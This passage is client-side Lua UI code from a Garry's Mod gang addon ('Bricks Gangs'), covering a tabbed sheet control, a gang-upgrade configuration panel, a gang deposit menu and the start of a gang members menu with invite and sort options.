	Sheet.Button.label = ((isfunction( label ) and label()) or label)

	Sheet.Panel = panel
	Sheet.Panel:SetParent( self.Content )
	Sheet.Panel:SetVisible( false )

	if ( self.ButtonOnly ) then
		Sheet.Button:SizeToContents()
	end

	table.insert( self.Items, Sheet )

	if ( !IsValid( self.ActiveButton ) ) then
		self:SetActiveButton( Sheet.Button )
	end
	
	return Sheet
end

function PANEL:Think()
	for k, v in pairs( self.Items ) do
		if( v.Think ) then
			v.Think()
		end
	end
end

function PANEL:SetActiveButton( active )
	if ( self.ActiveButton == active ) then return end

	if ( self.ActiveButton && self.ActiveButton.Target ) then
		local targetPanel = self.ActiveButton.Target
		targetPanel:SetVisible( false )
		self.ActiveButton:SetSelected( false )
		self.ActiveButton:SetToggle( false )
	end

	self.ActiveButton = active
	active.Target:SetVisible( true )
	active:SetSelected( true )
	active:SetToggle( true )

	if( active.onLoad ) then
		active.onLoad()
	end

	self.Content:InvalidateLayout()
end

function PANEL:SetActiveSheet( sheetLabel )
	if( not sheetLabel ) then return end

	for k, v in pairs( self.Items ) do
		if( v.Button and v.Button.label and v.Button.label == sheetLabel ) then
			self:SetActiveButton( v.Button )
			break
		end
	end
end

function PANEL:ClearSheets()
	self.Items = {}
	self.Navigation:Clear()
	self.Content:Clear()
end

derma.DefineControl( "bricks_server_colsheet_ranks", "", PANEL, "Panel" )

--PATH addons/bricks_gangs/lua/bricks_server/modules/gangs/vgui/bricks_server_config_gang_upgrades.lua:
local PANEL = {}

function PANEL:Init()

end

function PANEL:FillPanel( configPanel )
    function self.RefreshPanel()
        self:Clear()

        local sortedUpgrades = {}
        for k, v in pairs( BS_ConfigCopyTable.GANGS.Upgrades or {} ) do
            local upgradeTable = v
            upgradeTable.Key = k
            upgradeTable.SortValue = 1+((not v.Tiers and 100) or 0)

            table.insert( sortedUpgrades, upgradeTable )
        end

        table.SortByMember( sortedUpgrades, "SortValue", true )

        for k, v in pairs( sortedUpgrades ) do
            local devConfigTable = BRICKS_SERVER.DEVCONFIG.GangUpgrades[v.Type or v.Key]

            local itemActions = {
                [1] = { BRICKS_SERVER.Func.L( "edit" ), function()
                    BRICKS_SERVER.Func.CreateUpgradeEditor( v, v.Key, function( upgradeTable ) 
                        BS_ConfigCopyTable.GANGS.Upgrades[v.Key] = upgradeTable
                        BRICKS_SERVER.Func.ConfigChange( "GANGS" )
                        self.RefreshPanel()
                    end, function() end )
                end }
            }

            if( devConfigTable ) then
                if( devConfigTable.Unlimited ) then
                    table.insert( itemActions, { BRICKS_SERVER.Func.L( "remove" ), function()
                        BS_ConfigCopyTable.GANGS.Upgrades[v.Key] = nil
                        BRICKS_SERVER.Func.ConfigChange( "GANGS" )
                        self.RefreshPanel()
                    end, BRICKS_SERVER.DEVCONFIG.BaseThemes.Red, BRICKS_SERVER.DEVCONFIG.BaseThemes.DarkRed } )
                else
                    table.insert( itemActions, { BRICKS_SERVER.Func.L( "gangAddTier" ), function()
                        if( not BS_ConfigCopyTable.GANGS.Upgrades[v.Key].Tiers ) then
                            BS_ConfigCopyTable.GANGS.Upgrades[v.Key].Tiers = {}
                        end

                        table.insert( BS_ConfigCopyTable.GANGS.Upgrades[v.Key].Tiers, {
                            Price = 1500,
                            ReqInfo = {}
                        } )

                        BRICKS_SERVER.Func.ConfigChange( "GANGS" )
                        self.RefreshPanel()
                    end, BRICKS_SERVER.DEVCONFIG.BaseThemes.DarkGreen, BRICKS_SERVER.DEVCONFIG.BaseThemes.Green } ) 
                end
            end


            local itemBackPanel = vgui.Create( "DPanel", self )
            itemBackPanel:Dock( TOP )
            itemBackPanel:DockMargin( 0, 0, 0, 5 )
            itemBackPanel:SetTall( 100 )
            itemBackPanel.Paint = function( self2, w, h )
                surface.SetAlphaMultiplier( 50/255 )
                draw.RoundedBox( 5, 0, 0, w, h, BRICKS_SERVER.Func.GetTheme( 3 ) )
                surface.SetAlphaMultiplier( 1 )
            end

            local itemBack = vgui.Create( "DPanel", itemBackPanel )
            itemBack:Dock( TOP )
            itemBack:SetTall( 100 )
            itemBack:DockPadding( 0, 0, 25, 0 )
            local iconMat
            BRICKS_SERVER.Func.GetImage( v.Icon or "", function( mat ) iconMat = mat end )
            itemBack.Paint = function( self2, w, h )
                draw.RoundedBox( 5, 0, 0, w, h, BRICKS_SERVER.Func.GetTheme( 3 ) )
                draw.RoundedBox( 5, 5, 5, h-10, h-10, BRICKS_SERVER.Func.GetTheme( 2 ) )

                if( iconMat ) then
                    surface.SetDrawColor( 255, 255, 255, 255 )
                    surface.SetMaterial( iconMat )
                    local size = 64
                    surface.DrawTexturedRect( (h-size)/2, (h-size)/2, size, size )
                end

                draw.SimpleText( v.Name, "BRICKS_SERVER_Font33", h+15, 5, BRICKS_SERVER.Func.GetTheme( 6 ), 0, 0 )
                draw.SimpleText( (v.Description or BRICKS_SERVER.Func.L( "noDescription" )), "BRICKS_SERVER_Font20", h+15, 32, BRICKS_SERVER.Func.GetTheme( 6 ), 0, 0 )
            end

            for key2, val2 in ipairs( itemActions ) do
                local itemAction = vgui.Create( "DButton", itemBack )
                itemAction:Dock( RIGHT )
                itemAction:SetText( "" )
                itemAction:DockMargin( 5, 25, 0, 25 )
                surface.SetFont( "BRICKS_SERVER_Font25" )
                local textX, textY = surface.GetTextSize( val2[1] )
                textX = textX+20
                itemAction:SetWide( math.max( (ScrW()/2560)*150, textX ) )
                local changeAlpha = 0
                itemAction.Paint = function( self2, w, h )
                    if( self2:IsHovered() and not self2:IsDown() ) then
                        changeAlpha = math.Clamp( changeAlpha+10, 0, 75 )
                    else
                        changeAlpha = math.Clamp( changeAlpha-10, 0, 75 )
                    end
                    
                    draw.RoundedBox( 5, 0, 0, w, h, val2[3] or BRICKS_SERVER.Func.GetTheme( 2 ) )
            
                    surface.SetAlphaMultiplier( changeAlpha/255 )
                        draw.RoundedBox( 5, 0, 0, w, h, val2[4] or BRICKS_SERVER.Func.GetTheme( 3 ) )
                    surface.SetAlphaMultiplier( 1 )

                    BRICKS_SERVER.Func.DrawClickCircle( self2, w, h, val2[4] or BRICKS_SERVER.Func.GetTheme( 3 ) )
            
                    draw.SimpleText( val2[1], "BRICKS_SERVER_Font25", w/2, h/2, BRICKS_SERVER.Func.GetTheme( 6 ), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER )
                end
                itemAction.DoClick = function()
                    val2[2]()
                end
            end

            if( devConfigTable ) then
                if( not devConfigTable.Unlimited ) then
                    local tierCount = #v.Tiers
                    local tierTall = 40

                    itemBackPanel:SetTall( 100+(tierCount*(tierTall+5))+5 )

                    for key, val in pairs( v.Tiers ) do
                        local currentText = 0
                        local currentReqInfo = v.Default or {}
                        if( val.ReqInfo ) then
                            currentReqInfo = val.ReqInfo
                        end
        
                        if( devConfigTable.Format ) then
                            currentText = devConfigTable.Format( currentReqInfo )
                        else
                            currentText = currentReqInfo[1] or 0
                        end

                        local tierBack = vgui.Create( "DPanel", itemBackPanel )
                        tierBack:Dock( TOP )
                        tierBack:DockMargin( 5, 5, 5, 0 )
                        tierBack:SetTall( tierTall )
                        local width = 75
                        tierBack.Paint = function( self2, w, h )
                            draw.RoundedBox( 5, 0, 0, w, h, BRICKS_SERVER.Func.GetTheme( 3 ) )

                            draw.RoundedBoxEx( 5, 0, 0, width, h, BRICKS_SERVER.Func.GetTheme( 2 ), true, false, true, false )

                            draw.SimpleText( BRICKS_SERVER.Func.L( "gangTierX", key ), "BRICKS_SERVER_Font23", width/2, h/2, BRICKS_SERVER.Func.GetTheme( 6 ), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER )

                            draw.SimpleText( currentText, "BRICKS_SERVER_Font20", width+10, h/2, BRICKS_SERVER.Func.GetTheme( 6 ), 0, TEXT_ALIGN_CENTER )
                        end

                        surface.SetFont( "BRICKS_SERVER_Font20" )
                        local reqInfoX, reqInfoY = surface.GetTextSize( currentText )

                        local tierNoticeBack = vgui.Create( "DPanel", tierBack )
                        tierNoticeBack:SetSize( 0, 35 )
                        tierNoticeBack:SetPos( width+10+reqInfoX+10, (tierBack:GetTall()/2)-(tierNoticeBack:GetTall()/2) )
                        tierNoticeBack.Paint = function( self2, w, h ) end

                        local itemNotices = {}

                        table.insert( itemNotices, { DarkRP.formatMoney( val.Price or 0 ), BRICKS_SERVER.DEVCONFIG.BaseThemes.DarkGreen } )

                        if( val.Level ) then
                            table.insert( itemNotices, { BRICKS_SERVER.Func.L( "levelX", val.Level ) } )
                        end

                        if( val.Group ) then
                            local groupTable
                            for k, v in pairs( BRICKS_SERVER.CONFIG.GENERAL.Groups ) do
                                if( v[1] == val.Group ) then
                                    groupTable = v
                                end
                            end

                            if( groupTable ) then
                                table.insert( itemNotices, { (groupTable[1] or BRICKS_SERVER.Func.L( "none" )), groupTable[3] } )
                            end
                        end

                        for k, v in pairs( itemNotices ) do
                            surface.SetFont( "BRICKS_SERVER_Font20" )
                            local textX, textY = surface.GetTextSize( v[1] )
                            local boxW, boxH = textX+10, textY

                            local itemInfoNotice = vgui.Create( "DPanel", tierNoticeBack )
                            itemInfoNotice:Dock( LEFT )
                            itemInfoNotice:DockMargin( 0, 0, 5, 0 )
                            itemInfoNotice:SetWide( boxW )
                            itemInfoNotice.Paint = function( self2, w, h ) 
                                draw.RoundedBox( 5, 0, 0, w, h, (v[2] or BRICKS_SERVER.Func.GetTheme( 5 )) )
                                draw.SimpleText( v[1], "BRICKS_SERVER_Font20", w/2, (h/2)-1, BRICKS_SERVER.Func.GetTheme( 6 ), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER )
                            end

                            if( tierNoticeBack:GetWide() <= 5 ) then
                                tierNoticeBack:SetSize( tierNoticeBack:GetWide()+boxW, boxH )
                            else
                                tierNoticeBack:SetSize( tierNoticeBack:GetWide()+5+boxW, boxH )
                            end
                            tierNoticeBack:SetPos( width+10+reqInfoX+10, (tierBack:GetTall()/2)-(tierNoticeBack:GetTall()/2) )
                        end

                        local tierEdit = vgui.Create( "DButton", tierBack )
                        tierEdit:Dock( RIGHT )
                        tierEdit:SetWide( tierBack:GetTall() )
                        tierEdit:SetText( "" )
                        local Alpha = 0
                        local editMat = Material( "bricks_server/edit.png" )
                        tierEdit.Paint = function( self2, w, h ) 
                            if( not self2:IsDown() and self2:IsHovered() ) then
                                Alpha = math.Clamp( Alpha+5, 0, 100 )
                            else
                                Alpha = math.Clamp( Alpha-5, 0, 100 )
                            end
                        
                            draw.RoundedBoxEx( 5, 0, 0, w, h, BRICKS_SERVER.Func.GetTheme( 2 ), false, true, false, true )
                
                            surface.SetAlphaMultiplier( Alpha/255 )
                            draw.RoundedBoxEx( 5, 0, 0, w, h, BRICKS_SERVER.Func.GetTheme( 3 ), false, true, false, true )
                            surface.SetAlphaMultiplier( 1 )
                
                            BRICKS_SERVER.Func.DrawClickCircle( self2, w, h, BRICKS_SERVER.Func.GetTheme( 3 ) )
                
                            surface.SetDrawColor( 255, 255, 255, 20+(235*(Alpha/100)) )
                            surface.SetMaterial( editMat )
                            local iconSize = 24
                            surface.DrawTexturedRect( (h/2)-(iconSize/2), (h/2)-(iconSize/2), iconSize, iconSize )
                        end
                        tierEdit.DoClick = function()
                            BRICKS_SERVER.Func.CreateUpgradeTierEditor( val, key, v, v.Key, function( tierTable ) 
                                BS_ConfigCopyTable.GANGS.Upgrades[v.Key].Tiers[key] = tierTable
                                BRICKS_SERVER.Func.ConfigChange( "GANGS" )
                                self.RefreshPanel()
                            end, function() end )
                        end

                        local tierRemove = vgui.Create( "DButton", tierBack )
                        tierRemove:Dock( RIGHT )
                        tierRemove:SetWide( tierBack:GetTall() )
                        tierRemove:SetText( "" )
                        local Alpha = 0
                        local deleteMat = Material( "bricks_server/delete.png" )
                        tierRemove.Paint = function( self2, w, h ) 
                            if( not self2:IsDown() and self2:IsHovered() ) then
                                Alpha = math.Clamp( Alpha+5, 0, 100 )
                            else
                                Alpha = math.Clamp( Alpha-5, 0, 100 )
                            end
                        
                            surface.SetDrawColor( BRICKS_SERVER.Func.GetTheme( 2 ) )
                            surface.DrawRect( 0, 0, w, h )
                
                            surface.SetAlphaMultiplier( Alpha/255 )
                            surface.SetDrawColor( BRICKS_SERVER.Func.GetTheme( 3 ) )
                            surface.DrawRect( 0, 0, w, h )
                            surface.SetAlphaMultiplier( 1 )
                
                            BRICKS_SERVER.Func.DrawClickCircle( self2, w, h, BRICKS_SERVER.Func.GetTheme( 3 ) )
                
                            surface.SetDrawColor( 255, 255, 255, 20+(235*(Alpha/100)) )
                            surface.SetMaterial( deleteMat )
                            local iconSize = 24
                            surface.DrawTexturedRect( (h/2)-(iconSize/2), (h/2)-(iconSize/2), iconSize, iconSize )
                        end
                        tierRemove.DoClick = function()
                            table.remove( BS_ConfigCopyTable.GANGS.Upgrades[v.Key].Tiers, key )
                            BRICKS_SERVER.Func.ConfigChange( "GANGS" )
                            self.RefreshPanel()
                        end
                    end
                else
                    surface.SetFont( "BRICKS_SERVER_Font33" )
                    local nameX, nameY = surface.GetTextSize( v.Name )
        
                    local noticeBack = vgui.Create( "DPanel", itemBack )
                    noticeBack:SetSize( 0, 35 )
                    noticeBack:SetPos( itemBack:GetTall()+15+nameX+10, 5+(nameY/2)-(noticeBack:GetTall()/2) )
                    noticeBack.Paint = function( self2, w, h ) end
        
                    local itemNotices = {}
        
                    table.insert( itemNotices, { DarkRP.formatMoney( v.Price or 0 ), BRICKS_SERVER.DEVCONFIG.BaseThemes.DarkGreen } )
        
                    if( v.Level ) then
                        table.insert( itemNotices, { BRICKS_SERVER.Func.L( "levelX", v.Level ) } )
                    end
        
                    if( v.Group ) then
                        local groupTable
                        for key, val in pairs( BRICKS_SERVER.CONFIG.GENERAL.Groups ) do
                            if( val[1] == v.Group ) then
                                groupTable = val
                            end
                        end
        
                        if( groupTable ) then
                            table.insert( itemNotices, { (groupTable[1] or BRICKS_SERVER.Func.L( "none" )), groupTable[3] } )
                        end
                    end
        
                    for k, v in pairs( itemNotices ) do
                        surface.SetFont( "BRICKS_SERVER_Font23" )
                        local textX, textY = surface.GetTextSize( v[1] )
                        local boxW, boxH = textX+10, textY
        
                        local itemInfoNotice = vgui.Create( "DPanel", noticeBack )
                        itemInfoNotice:Dock( LEFT )
                        itemInfoNotice:DockMargin( 0, 0, 5, 0 )
                        itemInfoNotice:SetWide( boxW )
                        itemInfoNotice.Paint = function( self2, w, h ) 
                            draw.RoundedBox( 5, 0, 0, w, h, (v[2] or BRICKS_SERVER.Func.GetTheme( 5 )) )
                            draw.SimpleText( v[1], "BRICKS_SERVER_Font23", w/2, (h/2)-1, BRICKS_SERVER.Func.GetTheme( 6 ), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER )
                        end
        
                        if( noticeBack:GetWide() <= 5 ) then
                            noticeBack:SetSize( noticeBack:GetWide()+boxW, boxH )
                        else
                            noticeBack:SetSize( noticeBack:GetWide()+5+boxW, boxH )
                        end
                        noticeBack:SetPos( itemBack:GetTall()+15+nameX+10, 5+(nameY/2)-(noticeBack:GetTall()/2)+1 )
                    end
                end
            end
        end

        local addNewButton = vgui.Create( "DButton", self )
        addNewButton:Dock( TOP )
        addNewButton:SetText( "" )
        addNewButton:DockMargin( 0, 0, 0, 5 )
        addNewButton:SetTall( 40 )
        local changeAlpha = 0
        addNewButton.Paint = function( self2, w, h )
            if( self2:IsDown() ) then
                changeAlpha = math.Clamp( changeAlpha+10, 0, 125 )
            elseif( self2:IsHovered() ) then
                changeAlpha = math.Clamp( changeAlpha+10, 0, 75 )
            else
                changeAlpha = math.Clamp( changeAlpha-10, 0, 75 )
            end
            
            draw.RoundedBox( 5, 0, 0, w, h, BRICKS_SERVER.Func.GetTheme( 3 ) )
    
            surface.SetAlphaMultiplier( changeAlpha/255 )
            draw.RoundedBox( 5, 0, 0, w, h, BRICKS_SERVER.Func.GetTheme( 2 ) )
            surface.SetAlphaMultiplier( 1 )
    
            draw.SimpleText( "Add Upgrade", "BRICKS_SERVER_Font25", w/2, h/2, BRICKS_SERVER.Func.GetTheme( 6 ), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER )
        end
        addNewButton.DoClick = function()
            local options = {}
			for k, v in pairs( BRICKS_SERVER.DEVCONFIG.GangUpgrades ) do
				if( not v.Unlimited and BS_ConfigCopyTable.GANGS.Upgrades[k] ) then continue end

				options[k] = v.Name
			end

			BRICKS_SERVER.Func.ComboRequest( BRICKS_SERVER.Func.L( "admin" ), BRICKS_SERVER.Func.L( "gangNewUpgradeType" ), "", options, function( value, data ) 
				if( options[data] and BRICKS_SERVER.DEVCONFIG.GangUpgrades[data] ) then
                    local newUpgrade = {
                        Name = BRICKS_SERVER.Func.L( "gangNewUpgrade" ), 
                        Description = BRICKS_SERVER.Func.L( "gangNewUpgradeDesc" ),
                        Icon = "upgrade.png",
                    }

                    local key = data
                    if( BRICKS_SERVER.DEVCONFIG.GangUpgrades[data].Unlimited ) then
                        newUpgrade.Type = data
                        newUpgrade.ReqInfo = {}
                        newUpgrade.Price = 1500

                        local currentNum = 1
                        key = data .. "_1"

                        while BS_ConfigCopyTable.GANGS.Upgrades[key] do
                            currentNum = currentNum+1

                            key = data .. "_" .. currentNum
                        end
                    else
                        newUpgrade.Default = {}
                        newUpgrade.Tiers = {}
                    end
        
                    BS_ConfigCopyTable.GANGS.Upgrades[key] = newUpgrade
                    BRICKS_SERVER.Func.ConfigChange( "GANGS" )
                    self.RefreshPanel()
				else
					notification.AddLegacy( BRICKS_SERVER.Func.L( "invalidType" ), 1, 3 )
				end
            end, function() end, BRICKS_SERVER.Func.L( "ok" ), BRICKS_SERVER.Func.L( "cancel" ) )
        end
    end
    self.RefreshPanel()
end

function PANEL:Paint( w, h )
    
end

vgui.Register( "bricks_server_config_gang_upgrades", PANEL, "bricks_server_scrollpanel" )
--PATH addons/bricks_gangs/lua/bricks_server/modules/gangs/vgui/bricks_server_gang_deposit.lua:
local PANEL = {}

function PANEL:Init()
    self:SetSize( ScrW(), ScrH() )
    self:Center()
    self:MakePopup()
    self:SetTitle( "" )
    self:SetDraggable( false )
    self:ShowCloseButton( false )

    self.mainPanel = vgui.Create( "bricks_server_dframepanel", self )
    self.mainPanel:SetHeader( BRICKS_SERVER.Func.L( "gangDepositMenu" ) )
    self.mainPanel:SetSize( ScrW()*0.5, ScrH()*0.5 )
    self.mainPanel:Center()
    self.mainPanel.onCloseFunc = function()
		self:Remove()
	end

    local spacing = 5

    function self.RefreshPanel()
        if( IsValid( self.sheet ) ) then
            self.sheet:Remove()
        end

        if( IsValid( self.cover ) ) then
            self.cover:Remove()
        end

        self.sheet = vgui.Create( "bricks_server_colsheet_top", self.mainPanel )
        self.sheet:Dock( FILL )
        self.sheet.pageClickFunc = function( page )
            self.page = page
        end

        if( BRICKS_SERVER.Func.IsSubModuleEnabled( "essentials", "inventory" ) and table.Count( LocalPlayer():BRS():GetInventory() ) > 0 ) then
            local inventoryTable = LocalPlayer():BRS():GetInventory()

            local inventoryScroll = vgui.Create( "bricks_server_scrollpanel", self.sheet )
            inventoryScroll:Dock( FILL )
            inventoryScroll:DockMargin( 10, 10, 10, 10 )
            inventoryScroll.Paint = function( self, w, h ) end 
            self.sheet:AddSheet( BRICKS_SERVER.Func.L( "inventory" ), inventoryScroll, ((self.page or "") == BRICKS_SERVER.Func.L( "inventory" )) )

            local inventoryGrid = vgui.Create( "DIconLayout", inventoryScroll )
            inventoryGrid:Dock( FILL )
            inventoryGrid:SetSpaceY( spacing )
            inventoryGrid:SetSpaceX( spacing )

            self:FillItems( inventoryTable, inventoryGrid, function( key, val )
                local itemInfo = {}
                if( BRICKS_SERVER.Func.GetInvTypeCFG( ((val or {})[2] or {})[1] or "" ).GetInfo ) then
                    itemInfo = BRICKS_SERVER.Func.GetInvTypeCFG( ((val or {})[2] or {})[1] or "" ).GetInfo( val[2] )
                else
                    itemInfo = BRICKS_SERVER.DEVCONFIG.INVENTORY.DefaultEntFuncs.GetInfo( val[2] )
                end
    
                BRICKS_SERVER.Func.Query( BRICKS_SERVER.Func.L( "gangDepositInventoryQuery", itemInfo[1] ), BRICKS_SERVER.Func.L( "gang" ), BRICKS_SERVER.Func.L( "confirm" ), BRICKS_SERVER.Func.L( "cancel" ), function() 
                    net.Start( "BRS.Net.GangDepositInventory" )
                        net.WriteUInt( key, 10 )
                    net.SendToServer()
                end )
            end, function( key, val ) return not inventoryTable[key] end )
        end

        local playerInventory = {}

        for k, v in pairs( LocalPlayer():GetWeapons() ) do
            if( GAMEMODE.Config.DisallowDrop[v:GetClass()] or (v:GetModel() or "") == "" ) then continue end

            table.insert( playerInventory, { 1, { "spawned_weapon", v:GetModel(), v:GetClass() } } )
        end

        if( table.Count( playerInventory ) > 0 ) then
            local playerScroll = vgui.Create( "bricks_server_scrollpanel", self.sheet )
            playerScroll:Dock( FILL )
            playerScroll:DockMargin( 10, 10, 10, 10 )
            playerScroll.Paint = function( self, w, h ) end 
            self.sheet:AddSheet( BRICKS_SERVER.Func.L( "player" ), playerScroll, ((self.page or "") == BRICKS_SERVER.Func.L( "player" )) )

            local playerGrid = vgui.Create( "DIconLayout", playerScroll )
            playerGrid:Dock( FILL )
            playerGrid:SetSpaceY( spacing )
            playerGrid:SetSpaceX( spacing )

            self:FillItems( playerInventory, playerGrid, function( key, val )
                local itemInfo = {}
                if( BRICKS_SERVER.Func.GetInvTypeCFG( ((val or {})[2] or {})[1] or "" ).GetInfo ) then
                    itemInfo = BRICKS_SERVER.Func.GetInvTypeCFG( ((val or {})[2] or {})[1] or "" ).GetInfo( val[2] )
                else
                    itemInfo = BRICKS_SERVER.DEVCONFIG.INVENTORY.DefaultEntFuncs.GetInfo( val[2] )
                end

                BRICKS_SERVER.Func.Query( BRICKS_SERVER.Func.L( "gangDepositPlayerQuery", itemInfo[1] ), BRICKS_SERVER.Func.L( "gang" ), BRICKS_SERVER.Func.L( "confirm" ), BRICKS_SERVER.Func.L( "cancel" ), function() 
                    net.Start( "BRS.Net.GangDepositLoadout" )
                        net.WriteString( val[2][3] )
                    net.SendToServer()
                end )
            end, function( key, val ) return not LocalPlayer():HasWeapon( val[2][3] ) end )
        end

        if( #self.sheet.Items <= 0 ) then
            self.sheet:Remove()

            self.cover = vgui.Create( "DPanel", self.mainPanel )
            self.cover:Dock( FILL )
            self.cover.Paint = function( self2, w, h )
                draw.SimpleText( BRICKS_SERVER.Func.L( "gangNoDepositItems" ), "BRICKS_SERVER_Font25", w/2, h/2, BRICKS_SERVER.Func.GetTheme( 6 ), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER )
            end
        end
    end
    self.RefreshPanel()
end

local gradient = Material( "vgui/gradient_up" ) 
function PANEL:FillItems( items, grid, depositFunc, refreshFunc )
    local spacing = 5
    local gridWide = self.mainPanel:GetWide()-20
    local wantedSlotSize = 125
    local slotsWide = math.floor( gridWide/wantedSlotSize )
    local slotSize = (gridWide-((slotsWide-1)*spacing))/slotsWide

    for k, v in pairs( items ) do
        local slotBack = grid:Add( "DPanel" )
        slotBack:SetSize( slotSize, slotSize )
        local x, y, w, h = 0, 0, slotSize, slotSize
        local itemModel
        local changeAlpha = 0
        local itemInfo = {}
        if( BRICKS_SERVER.Func.GetInvTypeCFG( ((v or {})[2] or {})[1] or "" ).GetInfo ) then
            itemInfo = BRICKS_SERVER.Func.GetInvTypeCFG( ((v or {})[2] or {})[1] or "" ).GetInfo( v[2] )
        else
            itemInfo = BRICKS_SERVER.DEVCONFIG.INVENTORY.DefaultEntFuncs.GetInfo( v[2] )
        end
        
        local tooltipInfo = {}
        tooltipInfo[1] = { itemInfo[1], false, "BRICKS_SERVER_Font23B" }
        local rarityInfo
        if( itemInfo[3] ) then
            rarityInfo = BRICKS_SERVER.Func.GetRarityInfo( itemInfo[3] )
            tooltipInfo[2] = { itemInfo[3], function() return BRICKS_SERVER.Func.GetRarityColor( rarityInfo ) end, "BRICKS_SERVER_Font17" }
        end
        table.insert( tooltipInfo, itemInfo[2] )
        if( #itemInfo > 3 ) then
            for i = 4, #itemInfo do
                table.insert( tooltipInfo, itemInfo[i] )
            end
        end

        slotBack.Paint = function( self2, w, h )
            local toScreenX, toScreenY = self2:LocalToScreen( 0, 0 )
            if( x != toScreenX or y != toScreenY ) then
                x, y = toScreenX, toScreenY
                itemModel:SetBRSToolTip( x, y, w, h, tooltipInfo )
            end

            draw.RoundedBox( 8, 0, 0, w, h, BRICKS_SERVER.Func.GetTheme( 2 ) )
            
            if( itemModel:IsDown() ) then
                changeAlpha = 0
            elseif( itemModel:IsHovered() ) then
                changeAlpha = math.Clamp( changeAlpha+10, 0, 50 )
            else
                changeAlpha = math.Clamp( changeAlpha-10, 0, 50 )
            end

            surface.SetAlphaMultiplier( changeAlpha/255 )
            draw.RoundedBox( 5, 0, 0, w, h, BRICKS_SERVER.Func.GetTheme( 0 ) )
            surface.SetAlphaMultiplier( 1 )

            if( (v[1] or 1) > 1 ) then
                draw.SimpleText( "x" .. (v[1] or 1), "BRICKS_SERVER_Font20B", w-12, h-7, BRICKS_SERVER.Func.GetTheme( 6 ), TEXT_ALIGN_RIGHT, TEXT_ALIGN_BOTTOM )
            end
        end
        slotBack.Think = function()
            if( refreshFunc ) then
                local refresh = refreshFunc( k, v )

                if( refresh ) then
                    self.RefreshPanel()
                end
            end
        end

        if( rarityInfo ) then
            local rarityBox = vgui.Create( "bricks_server_raritybox", slotBack )
            rarityBox:SetSize( slotBack:GetWide(), 5 )
            rarityBox:SetPos( 0, slotBack:GetTall()-rarityBox:GetTall() )
            rarityBox:SetRarityName( rarityInfo[1] )
            rarityBox:SetCornerRadius( 8 )
            rarityBox:SetRoundedBoxDimensions( false, -15, false, 20 )
        end

        itemModel = vgui.Create( "DModelPanel" , slotBack )
        itemModel:Dock( FILL )
        itemModel:SetModel( ((v or {})[2] or {})[2] or "models/error.mdl" )
        itemModel:SetFOV( 50 )
        function itemModel:LayoutEntity( Entity ) return end

        if( BRICKS_SERVER.Func.GetInvTypeCFG( ((v or {})[2] or {})[1] or "" ).ModelDisplay ) then
            BRICKS_SERVER.Func.GetInvTypeCFG( ((v or {})[2] or {})[1] or "" ).ModelDisplay( itemModel, v[2] )
        else
            BRICKS_SERVER.DEVCONFIG.INVENTORY.DefaultEntFuncs.ModelDisplay( itemModel, v[2] )
        end

        itemModel.DoClick = function()
            depositFunc( k, v )
        end
    end
end

function PANEL:Paint( w, h )
    BRICKS_SERVER.Func.DrawBlur( self, 4, 4 )
end

vgui.Register( "bricks_server_gang_deposit", PANEL, "DFrame" )
--PATH addons/bricks_gangs/lua/bricks_server/modules/gangs/vgui/bricks_server_gangmenu_members.lua:
local PANEL = {}

function PANEL:Init()

end

function PANEL:FillPanel( gangTable )
    local topBar = vgui.Create( "DPanel", self )
    topBar:Dock( TOP )
    topBar:DockMargin( 10, 10, 10, 5 )
    topBar:SetTall( 40 )
    topBar.Paint = function( self2, w, h ) end

    if( LocalPlayer():GangHasPermission( "InvitePlayers" ) ) then
        local invite = vgui.Create( "DButton", topBar )
        invite:Dock( RIGHT )
        invite:DockMargin( 5, 0, 0, 0 )
        invite:SetWide( 40 )
        invite:SetText( "" )
        local Alpha = 0
        local inviteMat = Material( "bricks_server/invite.png" )
        invite.Paint = function( self2, w, h )
            if( self2:IsDown() ) then
                Alpha = 0
            elseif( self2:IsHovered() ) then
                Alpha = math.Clamp( Alpha+5, 0, 100 )
            else
                Alpha = math.Clamp( Alpha-5, 0, 100 )
            end
        
            draw.RoundedBox( 5, 0, 0, w, h, BRICKS_SERVER.Func.GetTheme( 3 ) )
            surface.SetAlphaMultiplier( Alpha/255 )
            draw.RoundedBox( 5, 0, 0, w, h, BRICKS_SERVER.Func.GetTheme( 2 ) )
            surface.SetAlphaMultiplier( 1 )
        
            surface.SetDrawColor( 255, 255, 255, 20+(235*(Alpha/100)) )
            surface.SetMaterial( inviteMat )
            local iconSize = 24
            surface.DrawTexturedRect( (w/2)-(iconSize/2), (h/2)-(iconSize/2), iconSize, iconSize )
        end
        invite.DoClick = function()
            local options = {}
            for k, v in player.Iterator() do
                if( gangTable.Members[v:SteamID()] ) then continue end
                
                options[v:SteamID()] = v:Nick() .. " (" .. ((not v:IsBot() and v:SteamID()) or "BOT") .. ")"
            end

            BRICKS_SERVER.Func.ComboRequest( BRICKS_SERVER.Func.L( "gang" ), BRICKS_SERVER.Func.L( "gangInvitePlayerQuery" ), BRICKS_SERVER.Func.L( "none" ), options, function( value, data ) 
                if( options[data] ) then
                    net.Start( "BRS.Net.GangInvite" )
                        net.WriteString( data )
                    net.SendToServer()
                else
                    notification.AddLegacy( BRICKS_SERVER.Func.L( "invalidPlayer" ), 1, 3 )
                end
            end, function() end, BRICKS_SERVER.Func.L( "ok" ), BRICKS_SERVER.Func.L( "cancel" ), true )
        end
    end

    local sortBy = vgui.Create( "bricks_server_combo", topBar )
    sortBy:Dock( RIGHT )
    sortBy:DockMargin( 5, 0, 0, 0 )
    sortBy:SetWide( 150 )
    sortBy:SetValue( BRICKS_SERVER.Func.L( "gangHighestRank" ) )
    local sortChoice = "rank_low_to_high"
    sortBy:AddChoice( BRICKS_SERVER.Func.L( "gangHighestRank" ), "rank_low_to_high" )
    sortBy:AddChoice( BRICKS_SERVER.Func.L( "gangLowestRank" ), "rank_high_to_low" )
    sortBy.OnSelect = function( self2, index, value, data )
        sortChoice = data
        self.RefreshPanel()
    end

    local searchBarBack = vgui.Create( "DPanel", topBar )
    searchBarBack:Dock( FILL )
    local search = Material( "materials/bricks_server/search.png" )
    local Alpha = 0
    local Alpha2 = 20
    local searchBar
    local color1 = BRICKS_SERVER.Func.GetTheme( 2 )
    searchBarBack.Paint = function( self2, w, h )
